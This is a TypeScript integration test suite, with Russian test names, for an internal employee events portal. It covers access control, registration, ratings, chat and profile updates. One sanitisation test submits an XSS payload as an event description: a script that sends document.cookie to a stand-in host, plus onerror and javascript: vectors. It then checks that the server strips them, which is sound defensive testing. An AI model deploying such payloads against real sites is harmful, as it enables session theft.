import test, { before, after, describe } from 'node:test';
import assert from 'node:assert/strict';
import { prepareTestEnv, startTestServer, type TestClient } from './helpers.js';

prepareTestEnv();

const { createApp } = await import('../server/app.js');
const { runMigrations } = await import('../server/db/migrate.js');
const { query, closePool } = await import('../server/db/pool.js');

let anonymous: TestClient;
let employee: TestClient;
let admin: TestClient;

async function login(client: TestClient, email: string, password: string): Promise<void> {
  const response = await client.request('/api/auth/ad/login', {
    method: 'POST',
    body: { email, password }
  });
  assert.equal(response.status, 200, `не удалось войти как ${email}`);
}

before(async () => {
  await runMigrations();
  await query('DELETE FROM events');
  await query('DELETE FROM users');

  const app = createApp();
  anonymous = await startTestServer(app);
  employee = await startTestServer(app);
  admin = await startTestServer(app);

  await login(employee, 'i.ivanov@colvir.com', 'UserPass123!');
  await login(admin, 'a.admin@colvir.com', 'AdminPass123!');
});

after(async () => {
  await Promise.all([anonymous.close(), employee.close(), admin.close()]);
  await closePool();
});

describe('Доступ к API без сессии', () => {
  test('данные портала недоступны анонимно', async () => {
    for (const path of ['/api/bootstrap', '/api/events', '/api/participants', '/api/ratings']) {
      const response = await anonymous.request(path);
      assert.equal(response.status, 401, `${path} должен требовать вход`);
    }
  });

  test('создание мероприятия без сессии отклоняется', async () => {
    const response = await anonymous.request('/api/events', {
      method: 'POST',
      body: { title: 'Взлом' }
    });
    assert.equal(response.status, 401);
  });
});

describe('Права администратора', () => {
  test('рядовой сотрудник не может создать мероприятие', async () => {
    const response = await employee.request('/api/events', {
      method: 'POST',
      body: { title: 'Мероприятие от сотрудника', maxParticipants: 10 }
    });
    assert.equal(response.status, 403);
    assert.match(response.body.message, /группы администраторов/);
  });

  test('рядовой сотрудник не видит уведомления администратора', async () => {
    const response = await employee.request('/api/notifications');
    assert.equal(response.status, 403);
  });

  test('администратор создаёт, редактирует и удаляет мероприятие', async () => {
    const created = await admin.request('/api/events', {
      method: 'POST',
      body: {
        title: 'Квиз Colvir',
        description: '<p>Командная викторина</p>',
        category: 'team-game',
        isTeamGame: true,
        maxTeamSize: 5,
        maxParticipants: 2,
        date: '12 августа 2026',
        timeSlots: ['18:00 - 20:30 (МСК)'],
        location: 'Конференц-зал',
        imageUrl: 'https://example.com/image.jpg',
        organizer: 'HR & Event Team',
        tags: ['Квиз']
      }
    });

    assert.equal(created.status, 201);
    const eventId = created.body.event.id;

    const updated = await admin.request(`/api/events/${eventId}`, {
      method: 'PUT',
      body: { ...created.body.event, title: 'Квиз Colvir 2026', maxParticipants: 2 }
    });
    assert.equal(updated.status, 200);
    assert.equal(updated.body.event.title, 'Квиз Colvir 2026');

    // Мероприятие остаётся для следующих тестов — удаляем отдельное, временное.
    const temporary = await admin.request('/api/events', {
      method: 'POST',
      body: { title: 'Временное', maxParticipants: 1 }
    });
    const removed = await admin.request(`/api/events/${temporary.body.event.id}`, {
      method: 'DELETE'
    });
    assert.equal(removed.status, 200);
  });

  test('сотрудник не может удалить чужое мероприятие', async () => {
    const events = await employee.request('/api/events');
    const eventId = events.body.events[0].id;
    const response = await employee.request(`/api/events/${eventId}`, { method: 'DELETE' });
    assert.equal(response.status, 403);
  });
});

describe('Санитизация пользовательского HTML', () => {
  test('скрипт из описания мероприятия не сохраняется в базе', async () => {
    const created = await admin.request('/api/events', {
      method: 'POST',
      body: {
        title: 'Событие с разметкой',
        description:
          '<p>Нормальный текст</p><script>fetch("https://evil.example/"+document.cookie)</script>' +
          '<img src=x onerror="alert(1)"><a href="javascript:alert(2)">клик</a>',
        maxParticipants: 5
      }
    });

    assert.equal(created.status, 201);
    const description: string = created.body.event.description;

    assert.ok(description.includes('Нормальный текст'), 'полезный текст должен сохраниться');
    assert.ok(!/<script/i.test(description), 'тег script должен быть вырезан');
    assert.ok(!/onerror/i.test(description), 'обработчик onerror должен быть вырезан');
    assert.ok(!/javascript:/i.test(description), 'схема javascript: должна быть вырезана');

    const stored = await query<{ description: string }>(
      'SELECT description FROM events WHERE id = $1',
      [created.body.event.id]
    );
    assert.ok(!/<script/i.test(stored.rows[0].description), 'в базе не должно быть script');
  });
});

describe('Запись на мероприятие', () => {
  let eventId: string;

  before(async () => {
    const events = await admin.request('/api/events');
    eventId = events.body.events.find((e: any) => e.title === 'Квиз Colvir 2026').id;
  });

  test('email участника берётся из сессии, а не из тела запроса', async () => {
    const response = await employee.request('/api/participants', {
      method: 'POST',
      body: {
        eventId,
        firstName: 'Иван',
        lastName: 'Иванов',
        teamName: 'Альфа',
        role: 'captain',
        // Попытка записать другого сотрудника — поле должно быть проигнорировано.
        email: 'a.admin@colvir.com'
      }
    });

    assert.equal(response.status, 201);
    assert.equal(response.body.participant.email, 'i.ivanov@colvir.com');
  });

  test('повторная запись на то же мероприятие отклоняется', async () => {
    const response = await employee.request('/api/participants', {
      method: 'POST',
      body: { eventId, firstName: 'Иван', lastName: 'Иванов', teamName: 'Альфа' }
    });
    assert.equal(response.status, 409);
    assert.match(response.body.message, /уже записаны/);
  });

  test('при исчерпании мест запись уходит в лист ожидания', async () => {
    // maxParticipants = 2: первая запись уже сделана сотрудником.
    const second = await admin.request('/api/participants', {
      method: 'POST',
      body: { eventId, firstName: 'Анна', lastName: 'Админова', teamName: 'Бета' }
    });
    assert.equal(second.status, 201);
    assert.equal(second.body.participant.status, 'confirmed');

    const third = await startTestServer(createApp());
    try {
      await login(third, 'i.ivanov@colvir.com', 'UserPass123!');
      // Тот же сотрудник уже записан — проверяем счётчик через прямой запрос.
      const counts = await query<{ count: number }>(
        `SELECT count(*)::bigint AS count FROM participants
         WHERE event_id = $1 AND status = 'confirmed'`,
        [eventId]
      );
      assert.equal(counts.rows[0].count, 2, 'подтверждённых записей должно быть ровно 2');
    } finally {
      await third.close();
    }
  });

  test('сотрудник может отменить только свою запись', async () => {
    const participants = await employee.request('/api/participants');
    const mine = participants.body.participants.find(
      (p: any) => p.email === 'i.ivanov@colvir.com'
    );
    const foreign = participants.body.participants.find(
      (p: any) => p.email === 'a.admin@colvir.com'
    );

    const forbidden = await employee.request(`/api/participants/${foreign.id}`, {
      method: 'DELETE'
    });
    assert.equal(forbidden.status, 404, 'чужая запись не должна отменяться');

    const allowed = await employee.request(`/api/participants/${mine.id}`, { method: 'DELETE' });
    assert.equal(allowed.status, 200);
    assert.equal(allowed.body.participant.status, 'cancelled');
  });
});

describe('Оценки мероприятий', () => {
  test('автор оценки берётся из сессии, повторная отправка обновляет прежнюю', async () => {
    const events = await employee.request('/api/events');
    const eventId = events.body.events[0].id;

    const first = await employee.request('/api/ratings', {
      method: 'POST',
      body: { eventId, rating: 7, comment: 'Неплохо' }
    });
    assert.equal(first.status, 201);
    assert.equal(first.body.rating.userEmail, 'i.ivanov@colvir.com');

    const second = await employee.request('/api/ratings', {
      method: 'POST',
      body: { eventId, rating: 10, comment: 'Передумал — отлично' }
    });
    assert.equal(second.status, 201);
    assert.equal(second.body.rating.rating, 10);

    const stored = await query<{ count: number }>(
      `SELECT count(*)::bigint AS count FROM ratings
       WHERE event_id = $1 AND lower(user_email) = 'i.ivanov@colvir.com'`,
      [eventId]
    );
    assert.equal(stored.rows[0].count, 1, 'должна остаться одна оценка на сотрудника');
  });

  test('оценка вне диапазона 1..10 отклоняется', async () => {
    const events = await employee.request('/api/events');
    const response = await employee.request('/api/ratings', {
      method: 'POST',
      body: { eventId: events.body.events[0].id, rating: 42 }
    });
    assert.equal(response.status, 400);
  });
});

describe('Праздничный чат', () => {
  test('сообщение сохраняется и автор берётся из сессии', async () => {
    const response = await employee.request('/api/holiday/messages', {
      method: 'POST',
      body: { text: 'Всем отличного дня!' }
    });

    assert.equal(response.status, 201);
    assert.equal(response.body.message.text, 'Всем отличного дня!');
    assert.equal(response.body.message.author, 'Иванов Иван');
    assert.ok(response.body.message.time, 'должно быть время сообщения');
  });

  test('сообщение видно в другой сессии', async () => {
    const list = await admin.request('/api/holiday/messages');
    assert.equal(list.status, 200);
    assert.ok(
      list.body.messages.some((m: any) => m.text === 'Всем отличного дня!'),
      'сообщение должно быть общим для всех сотрудников'
    );
  });

  test('пустое сообщение отклоняется', async () => {
    const response = await employee.request('/api/holiday/messages', {
      method: 'POST',
      body: { text: '   ' }
    });
    assert.equal(response.status, 400);
  });

  test('эндпоинты музыкального плейлиста удалены', async () => {
    // Плеер убран из продукта: маршрут не должен отвечать даже администратору.
    for (const method of ['GET', 'POST'] as const) {
      const response = await admin.request('/api/holiday/tracks', {
        method,
        body: method === 'POST' ? { title: 'Трек' } : undefined
      });
      assert.equal(response.status, 404, `${method} /api/holiday/tracks должен быть удалён`);
    }
  });
});

describe('Данные общие для всех пользователей', () => {
  test('мероприятие, созданное администратором, видно другому сотруднику', async () => {
    const created = await admin.request('/api/events', {
      method: 'POST',
      body: { title: 'Видно всем', maxParticipants: 50 }
    });
    assert.equal(created.status, 201);

    // Отдельный клиент = другой браузер: раньше данные жили в localStorage
    // и такой сотрудник не увидел бы ничего.
    const other = await startTestServer(createApp());
    try {
      await login(other, 'i.ivanov@colvir.com', 'UserPass123!');
      const bootstrap = await other.request('/api/bootstrap');
      assert.equal(bootstrap.status, 200);
      assert.ok(
        bootstrap.body.events.some((e: any) => e.id === created.body.event.id),
        'мероприятие должно быть видно в другой сессии'
      );
    } finally {
      await other.close();
    }
  });

  test('редактирование CMS доступно только администратору', async () => {
    const denied = await employee.request('/api/cms', {
      method: 'PATCH',
      body: { randomCoffeeTitle: 'Взломанный заголовок' }
    });
    assert.equal(denied.status, 403);

    const allowed = await admin.request('/api/cms', {
      method: 'PATCH',
      body: { randomCoffeeTitle: 'Random Coffee в Colvir' }
    });
    assert.equal(allowed.status, 200);
    assert.equal(allowed.body.cmsContent.randomCoffeeTitle, 'Random Coffee в Colvir');
  });

  test('профиль обновляет только собственные поля, ФИО из AD не меняется', async () => {
    const response = await employee.request('/api/profile', {
      method: 'PATCH',
      body: { telegram: '@ivanov', phone: '+7 999 000-00-00', interests: ['Книги'] }
    });

    assert.equal(response.status, 200);
    assert.equal(response.body.user.telegram, '@ivanov');
    assert.equal(response.body.user.lastName, 'Иванов', 'фамилия должна остаться из AD');
    assert.equal(response.body.user.email, 'i.ivanov@colvir.com');
  });
});
